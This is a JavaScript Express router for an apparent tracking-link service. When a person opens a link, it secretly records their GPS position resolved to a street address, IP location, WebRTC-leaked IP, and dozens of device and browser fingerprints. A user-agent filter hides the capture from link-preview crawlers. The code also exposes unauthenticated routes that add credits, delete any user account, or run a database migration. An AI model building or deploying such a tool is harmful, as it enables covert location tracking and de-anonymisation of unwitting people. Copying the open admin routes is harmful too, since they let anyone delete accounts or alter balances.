import express from "express";
import axios from "axios";
import { createTrackingLink, recordCapture, addCredits } from "../utils/linkService.js";

const router = express.Router();

// ── Parse browser/OS/device from User-Agent ──────────────────

function parseBrowser(ua = "") {
    if (/Edg\//i.test(ua)) return "Edge";
    if (/OPR|Opera/i.test(ua)) return "Opera";
    if (/SamsungBrowser/i.test(ua)) return "Samsung Browser";
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Safari/i.test(ua)) return "Safari";
    return "Unknown";
}

function parseOS(ua = "") {
    if (/Windows NT 10\.0/i.test(ua)) return "Windows 10/11";
    if (/Windows/i.test(ua)) return "Windows";
    const androidMatch = ua.match(/Android ([\d.]+)/i);
    if (androidMatch) return `Android ${androidMatch[1]}`;
    const iosMatch = ua.match(/iPhone OS ([\d_]+)/i);
    if (iosMatch) return `iOS ${iosMatch[1].replace(/_/g, ".")}`;
    if (/iPad.*OS ([\d_]+)/i.test(ua)) return "iPadOS";
    if (/Mac OS X/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
}

function parseDevice(ua = "") {
    if (/Mobi|Android.*Mobile/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

// ── Get real IP ───────────────────────────────────────────────

function getClientIP(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket?.remoteAddress || req.ip || "Unknown";
}

// ── Reverse geocode GPS → address via Nominatim ───────────────
// FIX: Added retry logic + better address field parsing

async function reverseGeocode(lat, lon) {
    // Try up to 2 times (Nominatim can occasionally time out)
    for (let attempt = 1; attempt <= 2; attempt++) {
        try {
            const res = await axios.get(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=en`,
                {
                    headers: {
                        "User-Agent": "Traxelon/1.0 (contact@traxelon.com)",
                        Accept: "application/json",
                    },
                    timeout: 8000,
                }
            );
            const data = res.data;
            const addr = data.address || {};

            // Build a clean, human-readable address (more fields than before)
            const addressParts = [
                addr.house_number,
                addr.road || addr.pedestrian || addr.footway,
                addr.suburb || addr.neighbourhood || addr.quarter,
                addr.village || addr.town || addr.city || addr.municipality,
                addr.state_district,
                addr.state,
                addr.postcode,
                addr.country,
            ].filter(Boolean);

            return {
                gpsAddress: data.display_name || addressParts.join(", ") || null,
                gpsCity: addr.city || addr.town || addr.village || addr.municipality || addr.county || null,
                gpsState: addr.state || null,
                gpsPincode: addr.postcode || null,
                gpsCountry: addr.country || null,
                gpsDistrict: addr.state_district || addr.county || null,
                gpsLocality: addr.suburb || addr.neighbourhood || addr.quarter || null,
                gpsRoad: addr.road || null,
            };
        } catch (err) {
            if (attempt === 2) {
                console.error("[reverseGeocode] Failed after 2 attempts:", err.message);
            } else {
                // Wait 1 second before retry
                await new Promise(r => setTimeout(r, 1000));
            }
        }
    }
    return {};
}

// ── IP enrichment via ip-api.com ──────────────────────────────

async function enrichIP(ip) {
    try {
        if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
            return { note: "Local IP — no enrichment" };
        }
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query`,
            { timeout: 5000 }
        );
        const d = res.data;
        if (d.status !== "success") return {};
        return {
            country: d.country,
            countryCode: d.countryCode,
            region: d.regionName,
            city: d.city,
            zip: d.zip,
            lat: d.lat,
            lon: d.lon,
            timezone: d.timezone,
            isp: d.isp,
            org: d.org,
            asn: d.as,
            hostname: d.reverse || null,
        };
    } catch {
        return {};
    }
}

// ── Routes ────────────────────────────────────────────────────

router.get("/health", (_req, res) => res.status(200).json({ ok: true }));

// POST /api/links/capture
router.post("/capture", async (req, res) => {
    try {
        const {
            token,
            // GPS — FIX: use null coalescing so gpsAccuracy=0 is preserved
            gpsLat,
            gpsLon,
            gpsAccuracy,
            // Hardware
            cpuCores, ram, gpu, gpuVendor, maxTouchPoints, cpu,
            // ── WebGL ──
            webglRenderer,
            webglVendor,
            webglVersion,
            webglShadingLanguageVersion,
            webglExtensions,
            webglMaxTextureSize,
            webglMaxViewportWidth,
            webglMaxViewportHeight,
            webglAntialiasing,
            // Battery
            batteryLevel,
            batteryCharging,
            batteryChargingTime,
            batteryDischargingTime,
            // Screen
            screenWidth, screenHeight, screenAvailWidth, screenAvailHeight,
            colorDepth, pixelDepth, pixelRatio, windowWidth, windowHeight,
            outerWidth,
            outerHeight,
            screenX,
            screenY,
            screenOrientation,
            screenOrientationAngle,
            screenOrientationType,
            screenIsExtended,
            isFullscreen,
            documentVisibility,
            scrollX,
            scrollY,
            deviceScaleFactor,
            colorGamut,
            // Browser
            language,
            languages,
            platform,
            cookiesEnabled,
            doNotTrack,
            historyLength,
            referrer,
            userAgent,
            appName,
            appVersion,
            appCodeName,
            product,
            productSub,
            vendor,
            vendorSub,
            onLine,
            pdfViewerEnabled,
            javaEnabled,
            documentTitle,
            documentCharset,
            documentCompatMode,
            documentReadyState,
            pluginsCount,
            mimeTypesCount,
            plugins,
            browserVersion,
            // Network
            connectionType,
            connectionDownlink,
            connectionDownlinkMax,
            connectionRtt,
            connectionSaveData,
            connectionType2,
            // ── Timezone & Locale ──
            timezone,
            timezoneOffset,
            timezoneOffsetMinutes,
            locale,
            hourCycle,
            calendar,
            numberingSystem,
            // ── Storage ──
            storageQuota,
            storageUsage,
            // ── Media Devices ──
            audioInputCount,
            audioOutputCount,
            videoInputCount,
            // ── Permissions ──
            permCamera,
            permMicrophone,
            permNotifications,
            permGeolocation,
            permClipboard,
            // ── Performance ──
            pageLoadTime,
            domContentLoaded,
            timeToFirstByte,
            deviceMemoryHeap,
            usedJSHeap,
            // Privacy & Fingerprint
            incognito,
            adBlockEnabled,
            canvasHash,
            audioFingerprint,
            fontCount,
            // ── Math fingerprint ──
            mathSin,
            mathCos,
            mathTan,
            mathLog,
            mathSqrt,
            mathAsin,
            mathSinh,
            mathCosh,
            mathExpm1,
            // ── CSS Media Queries ──
            prefersColorScheme,
            prefersReducedMotion,
            prefersContrast,
            forcedColors,
            hoverCapability,
            pointerType,
            pointerCoarse,
            pointerFine,
            anyHover,
            anyPointer,
            displayMode,
            // ── Browser Features ──
            hasServiceWorker,
            hasWebWorker,
            hasWebSocket,
            hasIndexedDB,
            hasWebRTC,
            hasCanvas,
            hasWebGL,
            hasWebGL2,
            hasBluetooth,
            hasUSB,
            hasNFC,
            hasGamepad,
            hasVibration,
            hasGeolocation,
            hasBattery,
            hasDeviceMemory,
            hasHardwareConcurrency,
            hasCredentials,
            hasShare,
            hasClipboard,
            hasWakeLock,
            hasSpeechRecognition,
            hasSpeechSynthesis,
            hasPaymentRequest,
            hasNotification,
            hasPushManager,
            hasCrypto,
            hasPerformance,
            hasIntersectionObserver,
            hasResizeObserver,
            hasMutationObserver,
            hasRequestAnimationFrame,
            hasFetch,
            hasLocalStorage,
            hasSessionStorage,
            hasTouch,
            // ── Page Context ──
            pageUrl,
            pageHostname,
            pageProtocol,
            pagePathname,
            pageSearch,
            pageHash,
            webRTCIP,
        } = req.body;

        if (!token) return res.status(400).json({ error: "token is required" });

        const ua = req.headers["user-agent"] || "";

        // ── Bot filter ─────────────────────────────────────────────
        const BOT_PATTERNS = /bot|crawl|spider|preview|slurp|facebookexternalhit|whatsapp|telegram|slack|discord|curl|wget|python|java|go-http|axios|node-fetch|undici/i;
        if (BOT_PATTERNS.test(ua)) {
            return res.status(200).json({ found: true, destinationUrl: null });
        }
        if (!screenWidth && !gpsLat && (!ua || ua.length < 40)) {
            return res.status(200).json({ found: true, destinationUrl: null });
        }
        // ──────────────────────────────────────────────────────────

        const ip = getClientIP(req);

        // Run IP enrichment and GPS geocoding in parallel for speed
        const [ipData, geoData] = await Promise.all([
            enrichIP(ip),
            // FIX: Check gpsLat/gpsLon are actual numbers (not null/undefined)
            (gpsLat != null && gpsLon != null)
                ? reverseGeocode(gpsLat, gpsLon)
                : Promise.resolve({}),
        ]);

        const deviceData = {
            ip,
            // IP-based location (approximate)
            country: ipData.country || null,
            countryCode: ipData.countryCode || null,
            region: ipData.region || null,
            city: ipData.city || null,
            zip: ipData.zip || null,
            lat: ipData.lat || null,
            lon: ipData.lon || null,
            timezone: ipData.timezone || null,
            isp: ipData.isp || null,
            org: ipData.org || null,
            asn: ipData.asn || null,
            hostname: ipData.hostname || null,

            // GPS (exact — only if user allowed location)
            // FIX: Use != null checks so value 0 isn't lost
            gpsLat: gpsLat != null ? gpsLat : null,
            gpsLon: gpsLon != null ? gpsLon : null,
            gpsAccuracy: gpsAccuracy != null ? gpsAccuracy : null,
            gpsAddress: geoData.gpsAddress || null,
            gpsCity: geoData.gpsCity || null,
            gpsState: geoData.gpsState || null,
            gpsPincode: geoData.gpsPincode || null,
            gpsCountry: geoData.gpsCountry || null,
            // New fields from improved reverseGeocode
            gpsDistrict: geoData.gpsDistrict || null,
            gpsLocality: geoData.gpsLocality || null,
            gpsRoad: geoData.gpsRoad || null,

            // Browser (parsed from UA server-side)
            browser: parseBrowser(ua),
            os: parseOS(ua),
            device: parseDevice(ua),
            userAgent: ua,
            // referrer: referrer || null,

            // Hardware
            cpuCores: cpuCores || null,
            ram: ram || null,
            gpu: gpu || null,
            gpuVendor: gpuVendor || null,
            maxTouchPoints: maxTouchPoints != null ? maxTouchPoints : null,
            cpu: cpu || null,

            // ── WebGL ──
            webglRenderer: webglRenderer || null,
            webglVendor: webglVendor || null,
            webglVersion: webglVersion || null,
            webglShadingLanguageVersion: webglShadingLanguageVersion || null,
            webglExtensions: webglExtensions != null ? webglExtensions : null,
            webglMaxTextureSize: webglMaxTextureSize || null,
            webglMaxViewportWidth: webglMaxViewportWidth || null,
            webglMaxViewportHeight: webglMaxViewportHeight || null,
            webglAntialiasing: webglAntialiasing != null ? webglAntialiasing : null,

            // ── Battery ──
            batteryLevel: batteryLevel != null ? batteryLevel : null,
            batteryCharging: batteryCharging != null ? batteryCharging : null,
            batteryChargingTime: batteryChargingTime != null ? batteryChargingTime : null,
            batteryDischargingTime: batteryDischargingTime != null ? batteryDischargingTime : null,

            // ── Screen & Display ──
            screenWidth: screenWidth || null,
            screenHeight: screenHeight || null,
            screenAvailWidth: screenAvailWidth || null,
            screenAvailHeight: screenAvailHeight || null,
            colorDepth: colorDepth || null,
            pixelDepth: pixelDepth || null,
            pixelRatio: pixelRatio || null,
            windowWidth: windowWidth || null,
            windowHeight: windowHeight || null,
            outerWidth: outerWidth || null,
            outerHeight: outerHeight || null,
            screenX: screenX != null ? screenX : null,
            screenY: screenY != null ? screenY : null,
            screenOrientation: screenOrientation || null,
            screenOrientationAngle: screenOrientationAngle != null ? screenOrientationAngle : null,
            screenOrientationType: screenOrientationType || null,
            screenIsExtended: screenIsExtended != null ? screenIsExtended : null,
            isFullscreen: isFullscreen != null ? isFullscreen : null,
            documentVisibility: documentVisibility || null,
            scrollX: scrollX != null ? scrollX : null,
            scrollY: scrollY != null ? scrollY : null,
            deviceScaleFactor: deviceScaleFactor || null,
            colorGamut: colorGamut || null,

            // ── Browser ──
            language: language || null,
            languages: languages || null,
            platform: platform || null,
            cookiesEnabled: cookiesEnabled != null ? cookiesEnabled : null,
            doNotTrack: doNotTrack || null,
            historyLength: historyLength || null,
            referrer: referrer || null,
            appName: appName || null,
            appVersion: appVersion || null,
            appCodeName: appCodeName || null,
            product: product || null,
            productSub: productSub || null,
            vendor: vendor || null,
            vendorSub: vendorSub || null,
            onLine: onLine != null ? onLine : null,
            pdfViewerEnabled: pdfViewerEnabled != null ? pdfViewerEnabled : null,
            javaEnabled: javaEnabled != null ? javaEnabled : null,
            documentTitle: documentTitle || null,
            documentCharset: documentCharset || null,
            documentCompatMode: documentCompatMode || null,
            documentReadyState: documentReadyState || null,
            pluginsCount: pluginsCount != null ? pluginsCount : null,
            mimeTypesCount: mimeTypesCount != null ? mimeTypesCount : null,
            plugins: plugins || null,
            browserVersion: browserVersion || null,

            // ── Network ──
            connectionType: connectionType || null,
            connectionDownlink: connectionDownlink || null,
            connectionDownlinkMax: connectionDownlinkMax || null,
            connectionRtt: connectionRtt || null,
            connectionSaveData: connectionSaveData != null ? connectionSaveData : null,
            connectionType2: connectionType2 || null,
 
            // ── Timezone & Locale ──
            timezoneOffset: timezoneOffset != null ? timezoneOffset : null,
            timezoneOffsetMinutes: timezoneOffsetMinutes != null ? timezoneOffsetMinutes : null,
            locale: locale || null,
            hourCycle: hourCycle || null,
            calendar: calendar || null,
            numberingSystem: numberingSystem || null,
 
            // ── Storage ──
            storageQuota: storageQuota != null ? storageQuota : null,
            storageUsage: storageUsage != null ? storageUsage : null,
 
            // ── Media Devices ──
            audioInputCount: audioInputCount != null ? audioInputCount : null,
            audioOutputCount: audioOutputCount != null ? audioOutputCount : null,
            videoInputCount: videoInputCount != null ? videoInputCount : null,
 
            // ── Permissions ──
            permCamera: permCamera || null,
            permMicrophone: permMicrophone || null,
            permNotifications: permNotifications || null,
            permGeolocation: permGeolocation || null,
            permClipboard: permClipboard || null,
 
            // ── Performance ──
            pageLoadTime: pageLoadTime != null ? pageLoadTime : null,
            domContentLoaded: domContentLoaded != null ? domContentLoaded : null,
            timeToFirstByte: timeToFirstByte != null ? timeToFirstByte : null,
            deviceMemoryHeap: deviceMemoryHeap != null ? deviceMemoryHeap : null,
            usedJSHeap: usedJSHeap != null ? usedJSHeap : null,
 
            // ── Privacy ──
            incognito: incognito != null ? incognito : null,
            adBlockEnabled: adBlockEnabled != null ? adBlockEnabled : null,
 
            // ── Fingerprints ──
            canvasHash: canvasHash || null,
            audioFingerprint: audioFingerprint || null,
            fontCount: fontCount != null ? fontCount : null,
 
            // ── Math fingerprint ──
            mathSin: mathSin != null ? mathSin : null,
            mathCos: mathCos != null ? mathCos : null,
            mathTan: mathTan != null ? mathTan : null,
            mathLog: mathLog != null ? mathLog : null,
            mathSqrt: mathSqrt != null ? mathSqrt : null,
            mathAsin: mathAsin != null ? mathAsin : null,
            mathSinh: mathSinh != null ? mathSinh : null,
            mathCosh: mathCosh != null ? mathCosh : null,
            mathExpm1: mathExpm1 != null ? mathExpm1 : null,
 
            // ── CSS Media Queries ──
            prefersColorScheme: prefersColorScheme || null,
            prefersReducedMotion: prefersReducedMotion != null ? prefersReducedMotion : null,
            prefersContrast: prefersContrast || null,
            forcedColors: forcedColors != null ? forcedColors : null,
            hoverCapability: hoverCapability || null,
            pointerType: pointerType || null,
            pointerCoarse: pointerCoarse != null ? pointerCoarse : null,
            pointerFine: pointerFine != null ? pointerFine : null,
            anyHover: anyHover != null ? anyHover : null,
            anyPointer: anyPointer || null,
            displayMode: displayMode || null,
 
            // ── Browser Features ──
            hasServiceWorker: hasServiceWorker != null ? hasServiceWorker : null,
            hasWebWorker: hasWebWorker != null ? hasWebWorker : null,
            hasWebSocket: hasWebSocket != null ? hasWebSocket : null,
            hasIndexedDB: hasIndexedDB != null ? hasIndexedDB : null,
            hasWebRTC: hasWebRTC != null ? hasWebRTC : null,
            hasCanvas: hasCanvas != null ? hasCanvas : null,
            hasWebGL: hasWebGL != null ? hasWebGL : null,
            hasWebGL2: hasWebGL2 != null ? hasWebGL2 : null,
            hasBluetooth: hasBluetooth != null ? hasBluetooth : null,
            hasUSB: hasUSB != null ? hasUSB : null,
            hasNFC: hasNFC != null ? hasNFC : null,
            hasGamepad: hasGamepad != null ? hasGamepad : null,
            hasVibration: hasVibration != null ? hasVibration : null,
            hasGeolocation: hasGeolocation != null ? hasGeolocation : null,
            hasBattery: hasBattery != null ? hasBattery : null,
            hasDeviceMemory: hasDeviceMemory != null ? hasDeviceMemory : null,
            hasHardwareConcurrency: hasHardwareConcurrency != null ? hasHardwareConcurrency : null,
            hasCredentials: hasCredentials != null ? hasCredentials : null,
            hasShare: hasShare != null ? hasShare : null,
            hasClipboard: hasClipboard != null ? hasClipboard : null,
            hasWakeLock: hasWakeLock != null ? hasWakeLock : null,
            hasSpeechRecognition: hasSpeechRecognition != null ? hasSpeechRecognition : null,
            hasSpeechSynthesis: hasSpeechSynthesis != null ? hasSpeechSynthesis : null,
            hasPaymentRequest: hasPaymentRequest != null ? hasPaymentRequest : null,
            hasNotification: hasNotification != null ? hasNotification : null,
            hasPushManager: hasPushManager != null ? hasPushManager : null,
            hasCrypto: hasCrypto != null ? hasCrypto : null,
            hasPerformance: hasPerformance != null ? hasPerformance : null,
            hasIntersectionObserver: hasIntersectionObserver != null ? hasIntersectionObserver : null,
            hasResizeObserver: hasResizeObserver != null ? hasResizeObserver : null,
            hasMutationObserver: hasMutationObserver != null ? hasMutationObserver : null,
            hasRequestAnimationFrame: hasRequestAnimationFrame != null ? hasRequestAnimationFrame : null,
            hasFetch: hasFetch != null ? hasFetch : null,
            hasLocalStorage: hasLocalStorage != null ? hasLocalStorage : null,
            hasSessionStorage: hasSessionStorage != null ? hasSessionStorage : null,
            hasTouch: hasTouch != null ? hasTouch : null,
 
            // ── Page Context ──
            pageUrl: pageUrl || null,
            pageHostname: pageHostname || null,
            pageProtocol: pageProtocol || null,
            pagePathname: pagePathname || null,
            pageSearch: pageSearch || null,
            pageHash: pageHash || null,
            webRTCIP: webRTCIP || null,   
        };

        const result = await recordCapture(token, deviceData);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /capture]", err.message);
        return res.status(500).json({ error: "Failed to record capture" });
    }
});

// POST /api/links/shorten (create tracking link from backend)
router.post("/shorten", async (req, res) => {
    try {
        const { uid, label, destinationUrl } = req.body;
        if (!uid) return res.status(400).json({ error: "uid is required" });
        const result = await createTrackingLink(uid, label, destinationUrl);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /shorten]", err.message);
        return res.status(400).json({ error: err.message });
    }
});

// GET /api/links/geo-ip
router.get("/geo-ip", async (req, res) => {
    const ip = getClientIP(req);
    const data = await enrichIP(ip);
    return res.status(200).json(data);
});

// POST /api/links/credits
router.post("/credits", async (req, res) => {
    try {
        const { uid, amount } = req.body;
        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
        await addCredits(uid, Number(amount));
        return res.status(200).json({ success: true });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

router.post("/delete-user", async (req, res) => {
    try {
        const { uid } = req.body;
        if (!uid) return res.status(400).json({ error: "uid required" });
        const adminApp = (await import("../firebase/config.js")).default;
        await adminApp.auth().deleteUser(uid);
        const { db } = await import("../firebase/config.js");
        await db.collection("users").doc(uid).delete();
        return res.status(200).json({ success: true });
    } catch (err) {
        console.error("[delete-user]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

// export default router;

// ── ONE-TIME MIGRATION: move captures array → subcollection ──────────────────
// Visit GET /api/links/migrate-captures once after deploying, then remove this route

router.get("/migrate-captures", async (req, res) => {
    try {
        const { db } = await import("../firebase/config.js");
        const admin = (await import("../firebase/config.js")).default;

        const linksSnap = await db.collection("trackingLinks").get();

        let totalLinks = 0;
        let totalMigrated = 0;
        let totalSkipped = 0;
        const errors = [];

        for (const linkDoc of linksSnap.docs) {
            const data = linkDoc.data();
            const captures = data.captures;

            if (!captures || !Array.isArray(captures) || captures.length === 0) {
                totalSkipped++;
                continue;
            }

            totalLinks++;
            const batch = db.batch();
            let hasGPS = false;

            for (const capture of captures) {
                const captureRef = linkDoc.ref.collection("captures").doc();
                batch.set(captureRef, {
                    ...capture,
                    capturedAt: capture.capturedAt || new Date().toISOString(),
                });
                if (capture.gpsLat != null && capture.gpsLon != null) {
                    hasGPS = true;
                }
                totalMigrated++;
            }

            batch.update(linkDoc.ref, {
                captureCount: captures.length,
                hasGPS: hasGPS,
                captures: admin.firestore.FieldValue.delete(),
            });

            try {
                await batch.commit();
            } catch (batchErr) {
                errors.push({ linkId: linkDoc.id, error: batchErr.message });
            }
        }

        return res.status(200).json({
            success: true,
            message: "Migration complete. Remove this route now.",
            totalLinksProcessed: totalLinks,
            totalCapturesMigrated: totalMigrated,
            totalLinksSkipped: totalSkipped,
            errors,
        });
    } catch (err) {
        console.error("[migrate-captures]", err.message);
        return res.status(500).json({ error: err.message });
    }
});

export default router;

